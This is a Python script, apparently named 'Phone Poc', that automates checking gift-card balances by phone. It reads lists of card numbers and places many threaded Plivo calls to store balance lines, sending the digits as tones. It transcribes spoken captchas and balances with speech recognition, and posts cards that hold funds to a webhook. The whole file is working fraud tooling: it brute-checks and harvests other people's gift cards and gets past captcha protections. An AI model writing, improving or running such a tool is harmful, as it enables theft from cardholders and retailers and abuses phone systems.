import json
import time
import random
import concurrent.futures
import plivo
import os
import speech_recognition as sr
import requests
from colorama import Fore
from os import system
import re
from datetime import datetime

numbers = [] # numbers in array are numbers that are called from
script_path = os.path.abspath(__file__) # i.e. /path/to/dir/foobar.py
script_dir = os.path.split(script_path)[0] #i.e. /path/to/dir/
rel_path = "Settings/settings.json"
abs_file_path = os.path.join(script_dir, rel_path)
file = open(abs_file_path, "r")
lines = file.read()
info = json.loads(lines)
checked = 0
total = 0
session_balance = 0.00

def phn():
    p=list("0000000000")
    p[0] = str(random.randint(1,9))
    for i in [1,2,6,7,8]:
        p[i] = str(random.randint(0,9))
    for i in [3,4]:
        p[i] = str(random.randint(0,8))
    if p[3]==p[4]==0:
        p[5]=str(random.randint(1,8))
    else:
        p[5]=str(random.randint(0,8))
    n = range(10)
    if p[6]==p[7]==p[8]:
        n = (i for i in n if i!=p[6])
    p[9] = str(random.choice(n))
    p = "".join(p)
    return "+1" + p[:3] + p[3:6] + p[6:]

def parseCombo(file_name, config_info, threads2):
    try:
        global checked
        global session_balance
        global total
        script_path = os.path.abspath(__file__)  # i.e. /path/to/dir/foobar.py
        script_dir = os.path.split(script_path)[0]  # i.e. /path/to/dir/
        rel_path = f"Cards/{file_name}"
        abs_file_path = os.path.join(script_dir, rel_path)
        file = open(abs_file_path, "r")
        cards = file.readlines()
        total = len(cards)
        if config_info["captcha"] == "none":
            system("title "+ config_info["store_name"] + " [+] Starting...")
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads2) as executor:
                for card in cards:
                    card = card.strip()
                    executor.submit(call_non_captcha, card, config_info)
                time.sleep(20)
        if config_info["captcha"] == "before":
            system("title "+ config_info["store_name"] + " [+] Starting Captcha...")
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads2) as executor:
                for card in cards:
                    card = card.strip()
                    executor.submit(call_captcha_before, card, config_info)
                time.sleep(20)
        if config_info["captcha"] == "after":
            system("title "+ config_info["store_name"] + " [+] Starting Captcha...")
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads2) as executor:
                for card in cards:
                    card = card.strip()
                    executor.submit(call_captcha_after, card, config_info)
                time.sleep(20)
    except Exception as e:
        print(f"ERROR IN PARSING COMBO: {e}")
        time.sleep(3)
        menu()

def call_non_captcha(card, config_info):
    try:
        global checked
        global total
        parsedCard = card.strip()
        number = random.choice(numbers)
        client = plivo.RestClient(info["plivo_auth_id"], info["plivo_auth_token"])
        time.sleep(2)
        if config_info["pin"] != True:
            digits_to_send = config_info["prefix"] + parsedCard + config_info["suffix"]
        else:
            digits_to_send = config_info["prefix"] + parsedCard + config_info["suffix"] + "123"
        response = client.calls.create(
            from_=number,
            to_= "+1" + config_info["phone_number"],
            answer_url="", # Need a url with wait xml
            answer_method="GET",
            send_digits=digits_to_send,
            time_limit=config_info["time_limit"]
        )
        print(f"[{card}] STARTING")
        uuid = response.request_uuid
        time.sleep(config_info["record_start_time"])
        url = record(uuid, card, config_info)
        time.sleep(config_info["transcribe_start_time"])
        betaTranscribe(url, card, config_info)
        if checked == total:
            time.sleep(20)
    except Exception as e:
        print(f"[{card}] {e}")
        call_non_captcha(card, config_info)

def call_captcha_before(card, config_info):
    try:
        global checked
        global total
        number = random.choice(numbers)
        parsedCard = "w".join(card)
        client = plivo.RestClient(info["plivo_auth_id"], info["plivo_auth_token"])
        response = client.calls.create(
            from_= number,
            to_= "+1" + config_info["phone_number"],
            answer_url= "", # need server with wait xml
            answer_method= "GET",
            time_limit= config_info["time_limit"]
        )
        print(f"[{card}] STARTING")
        uuid = response.request_uuid
        time.sleep(config_info["captcha_start_time"]) #22
        url = record(uuid, card, config_info)
        time.sleep(config_info["captcha_record_time"]) #5
        stop_recording(uuid, config_info)
        text = captchaTranscribe(url, card, config_info)
        cap = re.findall("\d{3}", text)
        if cap == []:
            print(f"[{card}] {text}")
            call_captcha_before(card, config_info)
        sent = client.calls.send_digits(
        call_uuid= uuid,
        digits= cap[0] + config_info["prefix"] + parsedCard + config_info["suffix"], )
        time.sleep(config_info["balance_start_time"]) #15
        balance_url = record(uuid, card, config_info)
        time.sleep(config_info["call_end_time"]) #15
        betaTranscribe(balance_url, card, config_info)
        if checked == total:
            time.sleep(20)
    except Exception as e:
        print(f"[{card}] {e}")
        call_captcha_before(card, config_info)

def call_captcha_after(card, config_info):
    try:
        global checked
        global total
        parsedCard = "w".join(card)
        number = random.choice(numbers)
        client = plivo.RestClient(info["plivo_auth_id"], info["plivo_auth_token"])
        response = client.calls.create(
            from_=number,
            to_="+1" + config_info["phone_number"],
            answer_url="", # need server with wait xml
            answer_method="GET",
            send_digits=config_info["prefix"] + parsedCard + config_info["suffix"],
            time_limit=config_info["time_limit"]
        )
        print(f"[{card}] STARTING")
        uuid = response.request_uuid
        time.sleep(config_info["captcha_start_time"])
        url = record(uuid, card, config_info)
        time.sleep(config_info["captcha_record_time"])
        stop_recording(uuid, config_info)
        text = captchaTranscribe(url, card, config_info)
        cap = re.findall("\d{3}", text)
        if cap == []:
            print(f"[{card}] {text}")
            call_captcha_after(card, config_info)
        digits = client.calls.send_digits(
        call_uuid=uuid,
        digits=cap[0], )
        balance_url = record(uuid, card, config_info)
        time.sleep(config_info["call_end_time"])
        betaTranscribe(balance_url, card, config_info)
        if checked == total:
            time.sleep(20)
    except IndexError:
        pass
    except Exception as e:
        print(f"[{card}] {e}")
        call_captcha_after(card, config_info)


def stop_recording(uuid, config_info):
    try:
        client = plivo.RestClient(info["plivo_auth_id"], info["plivo_auth_token"])
        client.calls.record_stop(
        call_uuid=uuid, )
    except Exception as e:
        print(f"RECORDING STOP ERROR: {e}")
        if config_info["captcha"] == "none":
            call_non_captcha(card, config_info)
        elif config_info["captcha"] == "before":
            call_captcha_before(card, config_info)
        elif config_info["captcha"] == "after":
            call_captcha_after(card, config_info)

def record(uuid, card, config_info):
    try:
        client = plivo.RestClient(info["plivo_auth_id"], info["plivo_auth_token"])
        recording = client.calls.record(
            call_uuid=uuid,
            file_format="wav" )
        return recording["url"]
    except Exception as e:
        print(Fore.RED + f"[{card}] CALL IN QUEUE.... RETRYING" + Fore.RESET)
        if config_info["captcha"] == "none":
            call_non_captcha(card, config_info)
        elif config_info["captcha"] == "before":
            call_captcha_before(card, config_info)
        elif config_info["captcha"] == "after":
            call_captcha_after(card, config_info)



def menu():
    os.system("cls" if os.name == "nt" else "clear")
    script_path = os.path.abspath(__file__) # i.e. /path/to/dir/foobar.py
    script_dir = os.path.split(script_path)[0] #i.e. /path/to/dir/
    rel_path = f"Configs"
    abs_file_path = os.path.join(script_dir, rel_path)
    arr = os.listdir(abs_file_path)
    print("""[+] Phone Poc [+]\n""")
    for i, store in enumerate(arr):
        script_path = os.path.abspath(__file__) # i.e. /path/to/dir/foobar.py
        script_dir = os.path.split(script_path)[0] #i.e. /path/to/dir/
        rel_path = f"Configs/{store}"
        abs_file_path = os.path.join(script_dir, rel_path)
        config = open(abs_file_path, "r")
        stuff = config.read()
        pop = json.loads(stuff)
        print(f'[{i + 1}] {pop["store_name"]}')

    config = input("\nPlease input a config to begin: ")
    try:
        int(config)
        if int(config) < len(arr) + 1:
            script_path = os.path.abspath(__file__) # i.e. /path/to/dir/foobar.py
            script_dir = os.path.split(script_path)[0] #i.e. /path/to/dir/
            rel_path = f"Configs/{arr[int(config) -1]}"
            abs_file_path = os.path.join(script_dir, rel_path)
            config = open(abs_file_path, "r")
            stuff = config.read()
            config_info = json.loads(stuff)
            file_name = input("Input the file name: ")
            if not file_name:
                file_name = "cards.txt"
            threads = int(input("Input Number of Threads: "))
            parseCombo(file_name, config_info, threads)
        else:
            print("Please Supply A Valid Menu Item")
            time.sleep(5)
            menu()
    except ValueError:
        print("Please supply the menu item!")
        time.sleep(5)
        menu()
    except Exception as e:
        print(e)
        time.sleep(5)
        menu()

def log(cardNumber, balance, config_info, url, transcription):
    try:
        script_path = os.path.abspath(__file__) # i.e. /path/to/dir/foobar.py
        script_dir = os.path.split(script_path)[0] #i.e. /path/to/dir/
        rel_path = "Logs/" + config_info["store_name"] + "_logs.txt"
        abs_file_path = os.path.join(script_dir, rel_path)
        log = open(abs_file_path, "a")
        log.write(f"[{cardNumber}] | url: {url} | transcribed: {transcription} | time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        log.close()
        script_path = os.path.abspath(__file__) # i.e. /path/to/dir/foobar.py
        script_dir = os.path.split(script_path)[0]
        rel_path2 = "Hits/" + config_info["store_name"] + "_hits.txt"
        abs_file_path2 = os.path.join(script_dir, rel_path2)
        hits = open(abs_file_path2, "a")
        hits.write(f"{cardNumber}: {balance}\n")
        hits.close()
    except Exception as e:
        print(f"{Fore.RED}LOGGING ERROR: {e}{Fore.RESET}")

def logInvalid(cardNumber, config_info, url, transcription, failure):
    try:
        script_path = os.path.abspath(__file__) # i.e. /path/to/dir/foobar.py
        script_dir = os.path.split(script_path)[0] #i.e. /path/to/dir/
        rel_path = "Logs/" + config_info["store_name"] + "_logs.txt"
        abs_file_path = os.path.join(script_dir, rel_path)
        log = open(abs_file_path, "a")
        log.write(f"[{cardNumber}] {failure} | url: {url} | transcribed: {transcription} | time: {time.time()}\n")
        log.close()
    except Exception as e:
        print(f"{Fore.RED}LOGGING ERROR: {e}{Fore.RESET}")


def webhook(cardNumber, balance, config_info):
    try:
        data = {
            "username": "infecting",
            "avatar_url": "https://i.pinimg.com/originals/d1/2d/32/d12d3295cad41d1a793d36db240aab91.gif",
            "embeds": [
                {
                    "title": "Gift Card Found From Phone Bot!",
                    "description": config_info["store_name"],
                    "color": 6677798,
                    "fields": [
                        {
                            "name": "Card Number",
                            "value": cardNumber,
                        },
                        {
                            "name": "Balance",
                            "value": balance,
                        },
                    ],
                    "thumbnail": {
                        "url": config_info["webhook_picture"]
                    },
                    "image": {
                        "url": "https://upload.wikimedia.org/wikipedia/commons/5/5a/A_picture_from_China_every_day_108.jpg"
                    },
                    "footer": {
                        "text": "infecting#0001",
                        "icon_url": "https://data.whicdn.com/images/330660236/original.gif"
                    }
                }
            ]
        }
        requests.post(
            info["webhook_url"],
            json=data)
    except Exception as e:
        print(Exception)

def captchaTranscribe(url, card, config_info):
    try:
        script_path = os.path.abspath(__file__) # i.e. /path/to/dir/foobar.py
        script_dir = os.path.split(script_path)[0] #i.e. /path/to/dir/
        rel_path = f"Logs/Audio/{card}captcha.wav"
        abs_file_path = os.path.join(script_dir, rel_path)
        r = requests.get(url)
        with open(abs_file_path, 'wb') as f:
            f.write(r.content)
            f.close()
        r = sr.Recognizer()
        with sr.AudioFile(abs_file_path) as source:
            audio = r.record(source)  # read the entire audio file
        # for testing purposes, we're just using the default API key
        # to use another API key, use `r.recognize_google(audio, key="GOOGLE_SPEECH_RECOGNITION_API_KEY")`
        # instead of `r.recognize_google(audio)`
        text = r.recognize_google(audio, key="") # need a valid google api key
        return text
    except Exception as e:
        print(f"CAPTCHA TRANSCRIPTION ERROR {e}")
        if config_info["captcha"] == "none":
            call_non_captcha(card, config_info)
        elif config_info["captcha"] == "before":
            call_captcha_before(card, config_info)
        elif config_info["captcha"] == "after":
            call_captcha_after(card, config_info)



def betaTranscribe(url, card, config_info):
    try:
        script_path = os.path.abspath(__file__) # i.e. /path/to/dir/foobar.py
        script_dir = os.path.split(script_path)[0] #i.e. /path/to/dir/
        rel_path = f"Logs/Audio/{card}.wav"
        abs_file_path = os.path.join(script_dir, rel_path)
        r = requests.get(url)
        with open(abs_file_path, 'wb') as f:
            f.write(r.content)
            f.close()
        r = sr.Recognizer()
        with sr.AudioFile(abs_file_path) as source:
            audio = r.record(source)
        text = r.recognize_google(audio, key="") # need a valid google api key
        global checked
        global session_balance
        session_balance = session_balance
        checked +=1
        if '$' in text:
            balance = re.findall('\$[0-9]+\.?[0-9]*', text)
            num = float(balance[0].replace("$", ""))
            session_balance += num
            system("title "+ config_info["store_name"] + f" [+] {checked}/{total} [+] ${session_balance}")
            print(Fore.GREEN + f"[{card}] {balance[0]}" + Fore.RESET)
            if balance[0] == "$0":
                logInvalid(card, config_info, url, text, "$0 HIT")
            else:
                log(card, balance[0], config_info, url, text)
                webhook(card, balance[0], config_info)
        elif 'not received' in text or 'your code is' in text or "match" in text:
            print(Fore.YELLOW + f"[{card}] CAPTCHA INVALID RETRYING..." + Fore.RESET)
            checked-=1
            system("title "+ config_info["store_name"] + f" [+] {checked}/{total} [+] ${session_balance}")
            logInvalid(card, config_info, url, text, "CAPTCHA INVALID")
            if config_info["captcha"] == 'after':
                call_captcha_after(card, config_info)
            elif config_info["captcha"] == 'before':
                call_captcha_before(card, config_info)
        else:
            print(f"{Fore.RED}[{card}] INVALID{Fore.RESET}")
            system("title "+ config_info["store_name"] + f" [+] {checked}/{total} [+] ${session_balance}")
            logInvalid(card, config_info, url, text, "INVALID")
    except Exception as e:
        print(f"[{card}] TRANSCRIPTION ERROR: {e}")
        if config_info["captcha"] == "none":
            call_non_captcha(card, config_info)
        elif config_info["captcha"] == "before":
            call_captcha_before(card, config_info)
        elif config_info["captcha"] == "after":
            call_captcha_after(card, config_info)

menu()
